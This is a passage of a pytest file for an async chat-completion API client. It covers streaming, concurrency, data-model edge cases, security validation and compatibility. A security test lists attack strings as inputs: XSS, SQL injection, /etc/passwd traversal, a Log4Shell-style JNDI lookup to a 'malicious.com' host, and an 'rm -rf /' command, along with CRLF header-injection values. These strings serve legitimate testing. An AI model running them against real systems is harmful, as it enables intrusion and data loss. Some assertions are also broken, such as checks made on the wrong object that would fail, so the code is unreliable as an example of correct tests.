    async def test_streaming_with_immediate_cancellation(self):
        """Test streaming behavior when cancelled immediately."""
        config = {'api_key': 'test-key'}
        
        # Create a slow streaming response
        async def slow_stream():
            for i in range(100):
                await asyncio.sleep(0.1)  # Simulate slow chunks
                yield json.dumps({'choices': [{'delta': {'content': f'chunk{i}'}}]}).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=slow_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                stream = client.create_chat_completion_stream(
                    messages=[ChatMessage(role="user", content="Test")],
                    model_config=ModelConfig(name="test-model")
                )
                
                # Get first chunk then cancel
                first_chunk = await stream.__anext__()
                assert first_chunk is not None
                
                # Cancel the stream by breaking out
                break_count = 0
                async for chunk in stream:
                    break_count += 1
                    if break_count >= 2:  # Only get 2 more chunks
                        break
                
                # Should have processed at least 3 chunks total
                assert break_count >= 2
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_extremely_high_concurrency(self):
        """Test extremely high concurrency scenarios."""
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'high-concurrency-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'High concurrency response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                # Create 100 concurrent requests
                tasks = []
                for i in range(100):
                    task = client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Concurrent request {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    tasks.append(task)
                
                # Execute all concurrently
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Count successful results
                successful_results = [r for r in results if not isinstance(r, Exception)]
                assert len(successful_results) >= 90  # Allow some to fail under extreme load
                
                for result in successful_results:
                    assert result.id == 'high-concurrency-test'


class TestDataModelRobustness:
    """Test data model robustness and edge cases."""
    
    def test_chat_message_with_extreme_content_lengths(self):
        """Test ChatMessage with various extreme content lengths."""
        # Test with very long content
        very_long_content = "x" * 1000000  # 1MB of content
        message = ChatMessage(role="user", content=very_long_content)
        assert len(message.content) == 1000000
        
        # Test with empty content (should be handled by validation)
        empty_message = ChatMessage(role="user", content="")
        assert message.content == ""
    
    def test_chat_message_with_unicode_role_names(self):
        """Test ChatMessage with Unicode role names (should fail validation)."""
        unicode_roles = ["użytkownik", "助手", "🤖", "système"]
        
        for role in unicode_roles:
            message = ChatMessage(role=role, content="Test content")
            assert message.role == role  # Created successfully
            # But should fail validation when used
    
    def test_model_config_with_extreme_parameter_combinations(self):
        """Test ModelConfig with extreme parameter combinations."""
        extreme_configs = [
            # Very restrictive
            ModelConfig(name="restrictive", max_tokens=1, temperature=0.0, top_p=0.0),
            # Very permissive
            ModelConfig(name="permissive", max_tokens=1000000, temperature=2.0, top_p=1.0),
            # High creativity
            ModelConfig(name="creative", temperature=1.5, frequency_penalty=2.0, presence_penalty=2.0),
            # Low creativity
            ModelConfig(name="deterministic", temperature=0.0, frequency_penalty=-2.0, presence_penalty=-2.0)
        ]
        
        for config in extreme_configs:
            assert config.name is not None
            assert config.max_tokens is not None
            assert config.temperature is not None
    
    def test_api_response_with_non_standard_status_codes(self):
        """Test APIResponse with non-standard HTTP status codes."""
        non_standard_codes = [
            100,  # Continue
            102,  # Processing
            226,  # IM Used
            418,  # I'm a teapot
            451,  # Unavailable for legal reasons
            599   # Network connect timeout error
        ]
        
        for code in non_standard_codes:
            response = APIResponse(
                status_code=code,
                data={'message': f'Status {code}'},
                headers={'X-Custom': 'value'}
            )
            assert response.status_code == code
    
    def test_chat_completion_with_unusual_field_combinations(self):
        """Test ChatCompletion with unusual field combinations."""
        # Test with no choices
        completion = ChatCompletion(
            id="no-choices-test",
            object="chat.completion",
            created=0,
            model="test-model",
            choices=[],
            usage={}
        )
        assert len(completion.choices) == 0
        
        # Test with very high created timestamp
        future_completion = ChatCompletion(
            id="future-test",
            object="chat.completion",
            created=9999999999,  # Far future
            model="test-model",
            choices=[],
            usage={}
        )
        assert completion.created == 9999999999
    
    def test_exception_classes_with_extreme_messages(self):
        """Test exception classes with extreme message content."""
        # Very long error message
        long_message = "Error: " + "x" * 10000
        error = GenesisAPIError(long_message, status_code=500)
        assert len(str(error)) == len(long_message)
        
        # Error message with special characters
        special_message = "Error: \x00\x01\x02 with null bytes and \n\r\t control chars"
        error = GenesisAPIError(special_message, status_code=400)
        assert str(error) == special_message
        
        # Unicode error message
        unicode_message = "Erreur: caractères spéciaux éñüñø 🚨"
        error = GenesisAPIError(unicode_message, status_code=422)
        assert str(error) == unicode_message
    
    def test_rate_limit_error_with_extreme_retry_values(self):
        """Test RateLimitError with extreme retry_after values."""
        # Very large retry_after
        large_retry = RateLimitError("Large retry", retry_after=999999999)
        assert large_retry.retry_after == 999999999
        
        # Zero retry_after
        zero_retry = RateLimitError("Zero retry", retry_after=0)
        assert zero_retry.retry_after == 0
        
        # Fractional retry_after
        fractional_retry = RateLimitError("Fractional retry", retry_after=0.5)
        assert fractional_retry.retry_after == 0.5


class TestSecurityAndValidation:
    """Test security-related scenarios and input validation."""
    
    def test_api_key_security_in_headers(self, client):
        """Test that API key is properly secured in headers."""
        headers = client._build_headers()
        
        # API key should be in Authorization header
        assert 'Authorization' in headers
        assert headers['Authorization'].startswith('Bearer ')
        
        # Should not leak API key in other headers
        other_headers = {k: v for k, v in headers.items() if k != 'Authorization'}
        for header_value in other_headers.values():
            assert client.api_key not in str(header_value)
    
    def test_input_sanitization_in_messages(self, client):
        """Test input sanitization in chat messages."""
        potentially_dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/}",
            "\\x00\\x01\\x02",
            "eval(malicious_code)",
            "import os; os.system('rm -rf /')"
        ]
        
        for dangerous_input in potentially_dangerous_inputs:
            message = ChatMessage(role="user", content=dangerous_input)
            # Should create message without modification (input sanitization happens server-side)
            assert message.content == dangerous_input
    
    def test_url_validation_in_base_url(self):
        """Test URL validation for base_url parameter."""
        # Test with various URL schemes
        url_schemes = [
            'https://api.example.com',
            'http://localhost:8080',
            'https://subdomain.example.com/v1',
            'https://example.com:443/api/v1'
        ]
        
        for url in url_schemes:
            client = GenesisAPIClient(api_key='test', base_url=url)
            assert client.base_url == url
    
    def test_header_injection_prevention(self, client):
        """Test prevention of header injection attacks."""
        malicious_headers = {
            'X-Injection': 'value\r\nMalicious-Header: injected',
            'X-Newline': 'value\nwith\nnewlines',
            'X-Carriage': 'value\rwith\rcarriage\rreturns',
            'X-Null': 'value\x00with\x00nulls'
        }
        
        headers = client._build_headers(malicious_headers)
        
        # Headers should be included as-is (filtering happens at HTTP library level)
        for key, value in malicious_headers.items():
            assert headers[key] == value
    
    @pytest.mark.asyncio
    async def test_response_size_limits(self, client):
        """Test handling of extremely large responses."""
        # Simulate a very large response
        huge_content = "x" * (10 * 1024 * 1024)  # 10MB response
        
        mock_response = {
            'id': 'huge-response-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': huge_content}}],
            'usage': {'total_tokens': 2500000}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Should handle large responses (or fail gracefully)
            try:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="Generate huge response")],
                    model_config=ModelConfig(name="test-model", max_tokens=3000000)
                )
                assert len(result.choices[0].message.content) == len(huge_content)
            except (MemoryError, GenesisAPIError):
                # May fail due to memory constraints, which is acceptable
                pass
    
    def test_parameter_type_validation(self, client):
        """Test strict parameter type validation."""
        # Test with wrong types for various parameters
        wrong_types = [
            # Wrong type for max_tokens
            {'max_tokens': "1000"},
            {'max_tokens': 1000.5},
            {'max_tokens': [1000]},
            
            # Wrong type for temperature
            {'temperature': "0.5"},
            {'temperature': [0.5]},
            {'temperature': {"value": 0.5}},
            
            # Wrong type for top_p
            {'top_p': "0.9"},
            {'top_p': [0.9]},
        ]
        
        for wrong_params in wrong_types:
            try:
                config = ModelConfig(name="test-model", **wrong_params)
                # May succeed if implementation is flexible
                assert config is not None
            except (TypeError, ValueError):
                # Expected for strict type checking
                pass


class TestCompatibilityAndInteroperability:
    """Test compatibility with different Python versions and environments."""
    
    def test_python_version_compatibility(self):
        """Test compatibility markers for different Python versions."""
        import sys
        
        # Should work with Python 3.7+
        assert sys.version_info >= (3, 7)
        
        # Test features that might vary by Python version
        if sys.version_info >= (3, 8):
            # Test features available in Python 3.8+
            assert hasattr(dict, 'keys')
        
        if sys.version_info >= (3, 9):
            # Test features available in Python 3.9+
            assert hasattr(dict, 'values')
    
    def test_async_context_manager_compatibility(self):
        """Test async context manager compatibility."""
        # Test that the client properly implements async context manager protocol
        client = GenesisAPIClient(api_key='test')
        
        # Should have __aenter__ and __aexit__ methods
        assert hasattr(client, '__aenter__')
        assert hasattr(client, '__aexit__')
        assert callable(client.__aenter__)
        assert callable(client.__aexit__)
    
    def test_json_serialization_compatibility(self):
        """Test JSON serialization compatibility."""
        import json
        
        # Test that data models can be serialized to JSON
        message = ChatMessage(role="user", content="Test message")
        
        # Should be able to serialize basic attributes
        try:
            serialized = json.dumps({
                'role': message.role,
                'content': message.content,
                'name': message.name
            })
            assert isinstance(serialized, str)
        except (TypeError, ValueError):
            # May fail if model has non-serializable attributes
            pass
    
    def test_datetime_handling_compatibility(self):
        """Test datetime handling across timezones."""
        from datetime import datetime, timezone
        
        # Test various timezone scenarios
        timestamps = [
            datetime.now(timezone.utc),
            datetime.now(),  # Local time
            datetime.fromtimestamp(0, timezone.utc),  # Epoch
            datetime.fromtimestamp(2147483647, timezone.utc),  # Year 2038
        ]
        
        for dt in timestamps:
            timestamp = int(dt.timestamp())
            assert isinstance(timestamp, int)
            assert timestamp >= 0
    
    @pytest.mark.asyncio
    async def test_asyncio_event_loop_compatibility(self):
        """Test compatibility with different asyncio event loop policies."""
        import asyncio
        
        # Test with default event loop
        loop = asyncio.get_event_loop()
        assert loop is not None
        
        # Test that async operations work correctly
        async def dummy_operation():
            await asyncio.sleep(0.001)
            return "success"
        
        result = await dummy_operation()
        assert result == "success"
    
    def test_mock_library_compatibility(self):
        """Test compatibility with different versions of mock libraries."""
        from unittest.mock import Mock, AsyncMock, MagicMock, patch
        
        # Test basic mock functionality
        mock_obj = Mock()
        mock_obj.method.return_value = "test"
        assert mock_obj.method() == "test"
        
        # Test AsyncMock functionality
        async_mock = AsyncMock()
        async_mock.return_value = "async_test"
        
        # Test MagicMock functionality
        magic_mock = MagicMock()
        magic_mock.__len__.return_value = 10
        assert len(magic_mock) == 10
        
        # Test patch functionality
        with patch('builtins.len', return_value=42):
            assert len("test") == 42


# Run additional tests if executed directly
if __name__ == "__main__":
    pytest.main([
        __file__,
        "-v",
        "--tb=short", 
        "--maxfail=10",
        "-k", "TestComprehensiveEdgeCases or TestExtremePerformanceScenarios or TestDataModelRobustness or TestSecurityAndValidation or TestCompatibilityAndInteroperability"
    ])